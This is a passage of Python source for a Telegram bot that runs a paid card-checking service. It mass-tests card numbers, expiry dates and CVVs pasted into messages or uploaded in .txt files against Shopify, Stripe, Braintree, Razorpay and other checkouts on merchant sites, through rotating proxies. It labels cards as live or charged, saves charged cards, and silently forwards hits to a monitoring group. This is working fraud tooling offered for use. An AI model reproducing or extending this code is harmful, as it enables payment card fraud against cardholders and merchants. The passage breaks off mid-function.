                    appr_text = _format_compact_result(cc, results[cc]["result"], results[cc]["bin"])
                    appr_text += f"\n\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    await _send_approved(appr_text)
                except Exception:
                    pass
                # Insufficient Funds notification to join channel
                if any(k in r_lower for k in ["insufficient_funds", "insufficient funds"]):
                    await _send_charged_notification(
                        user_id=user_id,
                        username=user_uname or "",
                        full_name=user_name or "",
                        amount=str(results[cc]["result"].get("Price", "-")),
                        gate_type="shopify",
                        status_label="Insufficient Funds",
                        header_title="INSUFFICIENT FUNDS",
                    )


# ══════════════════════════════════════════════════════════════════════════════
#  /cmds or /help COMMAND  (paginated — 3 pages to stay under 4096 char limit)
# ══════════════════════════════════════════════════════════════════════════════

def _help_page(page: int) -> tuple[str, dict]:
    """Return (text, reply_markup) for the given help page (1-based)."""
    TOTAL = 3

    def nav(p: int) -> dict:
        row = []
        if p > 1:
            row.append({
                "text": f"{bold('Back')}",
                "callback_data": f"helpp:{p - 1}",
                "icon_custom_emoji_id": E["help_prev"],
                "style": "primary",
            })
        row.append({
            "text": f"{bold(str(p))}/{bold(str(TOTAL))}",
            "callback_data": "helpp:noop",
            "style": "danger",
        })
        if p < TOTAL:
            row.append({
                "text": f"{bold('Next')}",
                "callback_data": f"helpp:{p + 1}",
                "icon_custom_emoji_id": E["help_next"],
                "style": "success",
            })
        return {"inline_keyboard": [row]}

    if page == 1:
        text = (
            f"{pe(E['gem'])} {bold('Command List')} — Page 1/3\n\n"
            f"{pe(E['bolt'])} /sh cc|mm|yy|cvv — {bold('Check a CC')}\n"
            f"{pe(E['rocket'])} /msh cc|mm|yy|cvv ... — {bold('Mass check (parallel)')}\n"
            f"{pe(E['dice'])} /ran — {bold('File check (reply to .txt)')}\n"
            f"{pe(E['gem'])} /ayd link cc... — {bold('Adyen checker')}\n"
            f"{pe(E['gem'])} /hit link cc... — {bold('Stripe checker')}\n\n"
            f"{pe(E['star'])} {bold('ST Commands (WooCommerce):')}\n"
            f"{pe(E['plus'])} /sadd site — {bold('Add/test WooCommerce site')}\n"
            f"{pe(E['bolt'])} /st cc|mm|yy|cvv — {bold('Single ST check')}\n"
            f"{pe(E['rocket'])} /mst cc ... — {bold('Mass ST check (10 inline)')}\n"
            f"{pe(E['dice'])} /stxt — {bold('ST file check (.txt)')}\n"
            f"{pe(E['globe'])} /smysite — {bold('View saved site')}\n"
            f"{pe(E['cross'])} /srem — {bold('Remove saved site')}\n"
            f"{pe(E['refresh'])} /stest sites... — {bold('Test sites (max 25)')}\n\n"
            f"{pe(E['star'])} {bold('Razorpay Commands:')}\n"
            f"{pe(E['plus'])} /rzsite site — {bold('Add/test RZ site')}\n"
            f"{pe(E['bolt'])} /rz cc|mm|yy|cvv — {bold('Single RZ check')}\n"
            f"{pe(E['rocket'])} /mrz cc ... — {bold('Mass RZ check (10 inline)')}\n"
            f"{pe(E['dice'])} /rztxt — {bold('RZ file check (.txt)')}\n"
            f"{pe(E['refresh'])} /rztest sites... — {bold('Test RZ sites (max 25)')}\n\n"
            f"{pe(E['star'])} {bold('Stripe $1 Gates (proxy):')}\n"
            f"{pe(E['bolt'])} /st1 — {bold('Stripe $1 single')}\n"
            f"{pe(E['rocket'])} /mst1 — {bold('Stripe $1 mass (20)')}\n"
            f"{pe(E['dice'])} /st1txt — {bold('Stripe $1 file')}\n\n"
            f"{pe(E['star'])} {bold('Stripe SK CVV ($1):')}\n"
            f"{pe(E['plus'])} /skadd sk — {bold('Save SK (auto PK + test charge)')}\n"
            f"{pe(E['bolt'])} /skcvv cc|mm|yy|cvv — {bold('Single SK charge')}\n"
            f"{pe(E['rocket'])} /mskcvv cc ... — {bold('Mass SK charge (10)')}\n"
            f"{pe(E['dice'])} /sktxt — {bold('SK file check (.txt)')}"
        )
    elif page == 2:
        text = (
            f"{pe(E['gem'])} {bold('Command List')} — Page 2/3\n\n"
            f"{pe(E['star'])} {bold('Stripe Auth (no proxy):')}\n"
            f"{pe(E['bolt'])} /chk cc|mm|yy|cvv — {bold('Single check')}\n"
            f"{pe(E['rocket'])} /mchk cc ... — {bold('Mass check (10 inline)')}\n"
            f"{pe(E['dice'])} /chktxt — {bold('File check (.txt)')}\n\n"
            f"{pe(E['star'])} {bold('Braintree VBV (2D/3D):')}\n"
            f"{pe(E['bolt'])} /vbv cc|mm|yy|cvv — {bold('Single VBV check')}\n"
            f"{pe(E['rocket'])} /mvbv cc ... — {bold('Mass VBV (20 inline)')}\n\n"
            f"{pe(E['star'])} {bold('Braintree Auth (silvercellwireless.com):')}\n"
            f"{pe(E['bolt'])} /br cc|mm|yy|cvv — {bold('Single check (all users)')}\n"
            f"{pe(E['rocket'])} /mbr cc ... — {bold('Mass check (owner only)')}\n"
            f"{pe(E['dice'])} /brtxt — {bold('File check (.txt, owner only)')}\n\n"
            f"{pe(E['star'])} {bold('B3 Auth')}\n"
            f"{pe(E['bolt'])} /b3 cc|mm|yy|cvv — {bold('Single check (all users)')}\n"
            f"{pe(E['rocket'])} /mb3 cc ... — {bold('Mass check (owner only)')}\n"
            f"{pe(E['dice'])} /b3txt — {bold('File check (.txt, owner only)')}\n\n"
            f"{pe(E['star'])} {bold('Proxy / Tools:')}\n"
            f"{pe(E['link'])} /proxy host:port:user:pass — {bold('Set proxy')}\n"
        f"{pe(E['gift'])} /freeproxy — {bold('Get 10 free proxies (24h cooldown)')}\n"
        f"{pe(E['link'])} /freeproxylist — {bold('Show pending fetched proxies')}\n"
        f"{pe(E['link'])} /myproxy — {bold('View current proxy')}\n"
        f"{pe(E['cross'])} /rmproxy — {bold('Remove proxy')}\n"
        f"{pe(E['globe'])} /dork keyword — {bold('Brave Search URL scraper (→ .txt)')}\n"
            f"{pe(E['bank'])} /bin 438854 — {bold('BIN lookup')}\n"
            f"{pe(E['gift'])} /redeem key — {bold('Redeem access key')}\n\n"
            f"{pe(E['star'])} {bold('Captcha Solver (NopeCHA):')}\n"
            f"{pe(E['bolt'])} /nopecha api_key — {bold('Set NopeCHA key')}\n"
            f"{pe(E['check'])} /nopecha — {bold('View key status')}\n"
            f"{pe(E['cross'])} /nopecha clear — {bold('Remove key')}"
        )
    else:
        text = (
            f"{pe(E['gem'])} {bold('Command List')} — Page 3/3\n\n"
            f"{pe(E['sparkle'])} {bold('AI Assistant (Kimi):')}\n"
            f"{pe(E['bolt'])} /ai prompt — {bold('Ask the AI anything')}\n"
            f"{pe(E['next'])} Attach up to 5 text/code files with your prompt\n"
            f"{pe(E['next'])} Long/code responses are sent as a file automatically\n\n"
            f"{pe(E['user'])} /start — {bold('Main menu')}\n"
            f"{pe(E['sparkle'])} /cmds — {bold('This help message')}\n\n"
            f"{pe(E['star'])} {bold('Admin Commands:')}\n"
            f"{pe(E['next'])} /admin id — {bold('Add admin')}\n"
            f"{pe(E['next'])} /auth id — {bold('Give premium')}\n"
            f"{pe(E['next'])} /unauth id — {bold('Remove premium')}\n"
            f"{pe(E['next'])} /ban id — {bold('Ban user')}\n"
            f"{pe(E['next'])} /unban id — {bold('Unban user')}\n"
            f"{pe(E['next'])} /key users days — {bold('Generate 1 multi-use key')}\n\n"
            f"{pe(E['gem'])} {bold('Premium roles:')} free · premium · admin · owner\n"
            f"{pe(E['bolt'])} {bold('Limits:')} free=100 · premium=1000 · admin=2000 · owner=3000"
        )

    return text, nav(page)


@router.message(Command("cmds", "help"))
async def cmd_help(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    text, kb = _help_page(1)
    await message.reply(text, reply_markup=kb)


@router.callback_query(F.data.startswith("helpp:"))
async def cb_help_page(callback: types.CallbackQuery):
    raw = callback.data.split(":", 1)[1]
    if raw == "noop":
        await callback.answer()
        return
    try:
        page = int(raw)
    except ValueError:
        await callback.answer()
        return
    page = max(1, min(3, page))
    text, kb = _help_page(page)
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  CATCH-ALL for non-command messages (CC in plain text)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.text & ~F.text.startswith("/"))
async def handle_plain_text(message: types.Message):
    """If a user sends raw CC(s) in PRIVATE chat, auto-detect and offer to check."""
    # Only in private chat
    if message.chat.type != "private":
        return

    text = message.text or ""

    # Try to find ALL CCs in the message
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    # Fallback: line-by-line
    if not all_ccs:
        for line in text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        return  # No CC found, ignore

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    if len(all_ccs) == 1:
        # Single CC — quick check button
        cc_str = all_ccs[0]
        check_btn = {
            "inline_keyboard": [
                [{
                    "text": f"{bold('Check This CC')}",
                    "callback_data": f"quick_check:{cc_str}",
                    "icon_custom_emoji_id": "5229077409629752304",
                    "style": "primary",
                }],
            ]
        }
        await message.reply(
            f"{pe(E['sparkle'])} {bold('CC Detected!')}\n\n"
            f"{pe(E['bolt'])} <tg-spoiler>{cc_str}</tg-spoiler>\n\n"
            f"{pe(E['next'])} {bold('Tap below to check it.')}",
            reply_markup=check_btn,
        )
    else:
        # Multiple CCs — mass check button
        count = min(len(all_ccs), MSH_MAX_CCS)
        ccs_joined = "\n".join(all_ccs[:MSH_MAX_CCS])
        # Store CCs in callback data is too long, use message_id reference
        check_btn = {
            "inline_keyboard": [
                [{
                    "text": f"{bold('Mass Check')} {bold(str(count))} {bold('CCs')}",
                    "callback_data": f"quick_msh:{message.message_id}",
                    "icon_custom_emoji_id": "5229077409629752304",
                    "style": "primary",
                }],
            ]
        }
        preview = "\n".join(f"{pe(E['bolt'])} <tg-spoiler>{cc}</tg-spoiler>" for cc in all_ccs[:5])
        extra = ""
        if len(all_ccs) > 5:
            extra = f"\n{pe(E['next'])} {bold('...')} {bold(str(len(all_ccs) - 5))} {bold('more')}"
        await message.reply(
            f"{pe(E['sparkle'])} {bold(str(len(all_ccs)))} {bold('CCs Detected!')}\n\n"
            f"{preview}{extra}\n\n"
            f"{pe(E['next'])} {bold('Tap below to mass check.')}",
            reply_markup=check_btn,
        )


@router.callback_query(F.data.startswith("quick_check:"))
async def cb_quick_check(callback: types.CallbackQuery):
    cc_str = callback.data.split(":", 1)[1]
    user_id = callback.from_user.id

    # Check proxy
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await callback.answer(bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await callback.answer()

    site = get_random_site()
    if not site:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No sites available!')}"
        )
        return

    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]

    loading_msg = await callback.message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Site:')} {bold(site.split('//')[1][:30] if '//' in site else site[:30])}\n"
        f"{pe(E['hourglass'])} {bold('Processing with Shopify gateway...')}"
    )

    # ── Run check + BIN lookup in parallel (saves 2-10s) ──────────────────────
    _chk = asyncio.create_task(checker_bridge.check_card_site(cc_str, site, proxy_data))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {
            "Response": str(e)[:80],
            "Price": "-",
            "Gate": "-",
            "Status": "Error",
        }
    bin_info = await _bin

    # Format result (same logic as /sh)
    response = result.get("Response", "Unknown")
    price = result.get("Price", "-")
    gate = result.get("Gate", "-")

    rl = response.lower()
    if _is_charged_response(response, result):
        status_emoji = E["gem"]
        status_line = f"{pe(E['gem'])} {bold('Order Placed!')}"
    elif any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        status_emoji = E["check2"]
        status_line = f"{pe(E['check2'])} {bold('Insufficient Funds — CVV Matched!')}"
    elif any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        status_emoji = E["check3"]
        status_line = f"{pe(E['check3'])} {bold('Incorrect CVC — CCN Matched!')}"
    elif any(k in rl for k in ["incorrect_zip"]):
        status_emoji = E["check"]
        status_line = f"{pe(E['check'])} {bold('Incorrect ZIP — Card is Live!')}"
    elif "otp_required" in rl or "3ds" in rl:
        status_emoji = E["check"]
        status_line = f"{pe(E['check'])} {bold('3DS / OTP Required — Card is Live!')}"
    elif any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        status_emoji = E["cross"]
        status_line = f"{pe(E['cross'])} {bold('Card Declined')}"
    elif "expired" in rl:
        status_emoji = E["cross2"]
        status_line = f"{pe(E['cross2'])} {bold('Card Expired')}"
    elif "risky" in rl:
        status_emoji = E["warn"]
        status_line = f"{pe(E['warn'])} {bold('Flagged as Risky')}"
    elif "incorrect_number" in rl:
        status_emoji = E["cross3"]
        status_line = f"{pe(E['cross3'])} {bold('Incorrect Card Number')}"
    else:
        status_emoji = E["warn2"]
        status_line = f"{pe(E['warn2'])} {bold(response[:60])}"

    result_text = (
        f"{status_line}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold(str(price))}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(callback.from_user.id, callback.from_user.full_name, callback.from_user.username)}"
    )

    try:
        await safe_edit(loading_msg, result_text)
    except Exception:
        await callback.message.reply(result_text)

    # Pin if order placed / charged
    if _is_charged_response(response, result):
        auth.save_charged_cc(cc_str, user_id, (callback.from_user.full_name or "Unknown"), gate, str(price))
        try:
            await bot.pin_chat_message(callback.message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        # Silent forward to monitor group
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  QUICK MASS CHECK CALLBACK (from CC detect button)
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("quick_msh:"))
async def cb_quick_msh(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    # Check proxy
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await callback.answer(bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await callback.answer()

    # Get the original message that had the CCs
    orig_msg = callback.message.reply_to_message
    if not orig_msg:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Original message not found!')}"
        )
        return

    text = orig_msg.text or orig_msg.caption or ""

    # Extract CCs
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No CCs found in the original message!')}"
        )
        return

    all_ccs = all_ccs[:MSH_MAX_CCS]

    # ── Gen-checker detection ─────────────────────────────────────────────────
    if not await guard_gen_cards(all_ccs, callback.message, callback.from_user.id):
        return

    # ── Pre-load sites ONCE ───────────────────────────────────────────────────
    sites_list = _load_sites()
    if not sites_list:
        await callback.message.reply(f"{pe(E['cross'])} {bold('No sites available!')}")
        return

    user_name = callback.from_user.full_name or ""
    user_uname = callback.from_user.username or ""
    total = len(all_ccs)

    # Build single status message
    init_lines = [f"{pe(E['bolt'])} {bold('Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await callback.message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)

    tasks = [
        asyncio.create_task(
            _msh_check_single(cc, proxy_data, status_msg, results, order, user_name, user_uname, user_id, sites_list)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-DETECT .txt FILE IN PRIVATE CHAT
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.document & F.chat.type.in_({"private"}))
async def handle_private_document(message: types.Message):
    """Auto-detect .txt CC files dropped in private chat."""
    doc = message.document
    if not doc or not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        return

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if auth.is_banned(message.from_user.id):
        return
    if await guard_gen_filename(message, message.from_user.id):
        return

    # Download and count CCs
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    # Fallback: line-by-line
    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found in this file!')}"
        )
        return

    count = len(all_ccs)

    # Preview first 5 CCs
    preview = "\n".join(f"{pe(E['bolt'])} <tg-spoiler>{cc}</tg-spoiler>" for cc in all_ccs[:5])
    extra = ""
    if count > 5:
        extra = f"\n{pe(E['next'])} {bold('...')} {bold(str(count - 5))} {bold('more')}"

    check_btn = {
        "inline_keyboard": [
            [{
                "text": f"{bold('Check')} {bold(str(count))} {bold('CCs')}",
                "callback_data": f"quick_ran:{message.message_id}",
                "icon_custom_emoji_id": "5229077409629752304",
                "style": "primary",
            }],
        ]
    }

    await message.reply(
        f"{pe(E['sparkle'])} {bold('CC File Detected!')} {pe(E['dice'])}\n\n"
        f"{pe(E['bolt'])} {bold('File:')} {bold(doc.file_name)}\n"
        f"{pe(E['star'])} {bold('Total CCs:')} {bold(str(count))}\n\n"
        f"{preview}{extra}\n\n"
        f"{pe(E['next'])} {bold('Tap below to start checking.')}",
        reply_markup=check_btn,
    )


@router.callback_query(F.data.startswith("quick_ran:"))
async def cb_quick_ran(callback: types.CallbackQuery):
    """Handle the Check button from auto-detected .txt files in private chat."""
    user_id = callback.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, callback.message.chat.id):
        await callback.answer(bold("Premium required! /redeem or contact admin"), show_alert=True)
        return

    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await callback.answer(bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await callback.answer()

    # Get the original message that had the .txt file
    orig_msg = callback.message.reply_to_message
    if not orig_msg or not orig_msg.document:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Original file not found!')}"
        )
        return

    doc = orig_msg.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Only .txt files are supported!')}"
        )
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if await guard_gen_filename(callback.message, user_id):
        return

    # Download file
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Failed to download file!')}"
        )
        return

    # Extract CCs
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No CCs found in the file!')}"
        )
        return

    user_name = callback.from_user.full_name or ""
    user_uname = callback.from_user.username or ""

    # Apply CC limit
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]

    # ── Gen-checker detection ─────────────────────────────────────────────────
    if not await guard_gen_cards(all_ccs, callback.message, user_id):
        return

    total = len(all_ccs)
    chat_id = callback.message.chat.id

    # ── Block duplicate runs ──────────────────────────────────────────────────
    if user_id in _RAN_ACTIVE_USERS:
        await callback.message.reply(
            f"{pe(E['warn'])} {bold('MF! Your file check already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{chat_id}:{user_id}"
    _RAN_STOP_FLAGS[stop_key] = False
    _RAN_ACTIVE_USERS.add(user_id)

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }

        status_msg = await callback.message.reply(
            f"{pe(E['rocket'])} {bold('File Check Started!')} {pe(E['dice'])}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy + site per CC')}\n"
            f"{pe(E['star'])} {bold('Auto-retry on dead sites')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )

        await _process_ran_cards(all_ccs, user_id, user_name, user_uname, chat_id, status_msg, stop_key)
    finally:
        _RAN_ACTIVE_USERS.discard(user_id)


# ══════════════════════════════════════════════════════════════════════════════
#  /ran COMMAND — File-based CC Check (high parallel, approved only)
# ══════════════════════════════════════════════════════════════════════════════

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead',
)

_APPROVED_INDICATORS = (
    'order completed', 'order_placed', 'processedreceipt', '💎',
    'insufficient_funds', 'insufficient funds',
    'incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv',
    'incorrect_zip',
)

_RAN_STOP_FLAGS: dict[str, bool] = {}   # "chat_id:user_id" -> stop flag
_RAN_ACTIVE_USERS: set[int] = set()      # user IDs with an active /ran in progress
# 8 checker nodes × 16 gunicorn workers = 128 slots — 100 per user, 600 global
RAN_PER_USER = 100                       # parallel checks per /ran session
_RAN_GLOBAL_LIMIT = 600                  # max /ran checks across ALL users at once
_ran_global_sem = asyncio.Semaphore(_RAN_GLOBAL_LIMIT)
_ran_user_sems: dict[int, asyncio.Semaphore] = {}


def get_ran_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _ran_user_sems:
        _ran_user_sems[user_id] = asyncio.Semaphore(RAN_PER_USER)
    return _ran_user_sems[user_id]


def release_ran_user_semaphore(user_id: int):
    _ran_user_sems.pop(user_id, None)


async def _ran_check_one(
    cc_str: str, site: str, proxy_list: list, sites_list: list, user_id: int,
) -> dict:
    """Run one /ran check with global + per-user limits (not shared /sh /msh sem)."""
    proxy_data = random.choice(proxy_list) if proxy_list else None
    user_sem = get_ran_user_semaphore(user_id)

    # NOTE: checker_bridge → shopify_check_with_fallback already retries on dead
    # sites internally, so we do NOT add a second full retry here. Doing both
    # meant one CC could chain up to ~10 timeouts and freeze a worker for minutes.
    async with _ran_global_sem:
        async with user_sem:
            try:
                result = await checker_bridge.check_card_site(cc_str, site, proxy_data)
            except Exception as e:
                result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}

    return result


async def _deliver_ran_hit(
    cc: str, result: dict, raw_response: str, is_charged: bool,
    user_id: int, user_name: str, user_uname: str, chat_id: int,
):
    """Send hit messages in background so workers keep checking."""
    try:
        gate = result.get("Gate", "-")
        price = result.get("Price", "-")
        bin_num = cc.split("|")[0][:6]
        bin_info = await bin_lookup(bin_num)
        status_line = _format_status_line(raw_response)

        hit_text = (
            f"{status_line}\n\n"
            f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
            f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
            f"{pe(R['price'])} {bold('Price:')} {bold(str(price))}\n\n"
            f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
            f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
            f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
            f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
            f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
            f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )

        sent_msg = await bot.send_message(chat_id, hit_text)
        if is_charged:
            try:
                await bot.pin_chat_message(chat_id, sent_msg.message_id, disable_notification=True)
            except Exception:
                pass
            auth.save_charged_cc(cc, user_id, user_name, gate, str(price))
            try:
                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
            except Exception:
                pass
            # Charged notification to join channel
            await _send_charged_notification(
                user_id=user_id,
                username=user_uname or "",
                full_name=user_name or "",
                amount=str(price),
                gate_type="shopify",
            )
        else:
            await _send_approved(hit_text)
            # Insufficient Funds notification to join channel
            _raw_lo = raw_response.lower()
            if any(k in _raw_lo for k in ["insufficient_funds", "insufficient funds"]):
                await _send_charged_notification(
                    user_id=user_id,
                    username=user_uname or "",
                    full_name=user_name or "",
                    amount=str(price),
                    gate_type="shopify",
                    status_label="Insufficient Funds",
                    header_title="INSUFFICIENT FUNDS",
                )
    except Exception:
        pass


async def _process_ran_cards(
    all_ccs: list, user_id: int, user_name: str, user_uname: str, chat_id: int,
    status_msg: types.Message, stop_key: str,
):
    """Process /ran with a worker pool — always N cards in flight, non-blocking hits."""
    total = len(all_ccs)
    checked, approved, charged, declined, skipped = 0, 0, 0, 0, 0
    _start_time = time.time()
    _last_status_edit = 0.0
    _state_lock = asyncio.Lock()
    _edit_lock   = asyncio.Lock()   # prevents concurrent safe_edit calls on status_msg
    _last_response = "-"
    _last_cc = ""

    sites_list = _load_sites()
    proxy_list = get_user_proxies(user_id)

    if not sites_list:
        try:
            await safe_edit(status_msg, f"{pe(E['cross'])} {bold('No sites available!')}")
        except Exception:
            pass
        return

    if not proxy_list:
        try:
            await safe_edit(status_msg, f"{pe(E['cross'])} {bold('No proxies set!')}")
        except Exception:
            pass
        return

    cc_queue: asyncio.Queue[str] = asyncio.Queue()
    for cc in all_ccs:
        cc_queue.put_nowait(cc)

    async def _maybe_update_status(force: bool = False):
        nonlocal _last_status_edit
        # Fast pre-check without lock to avoid contention on every CC result
        _now = time.time()
        if not force and _now - _last_status_edit < 4 and checked + skipped < total:
            return
        # Lock ensures only ONE worker edits at a time — prevents FloodWait cascade
        if _edit_lock.locked() and not force:
            return
        async with _edit_lock:
            # Re-check inside the lock (another worker may have just edited)
            _now = time.time()
            if not force and _now - _last_status_edit < 4 and checked + skipped < total:
                return
            _last_status_edit = _now

        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }
        progress_text = (
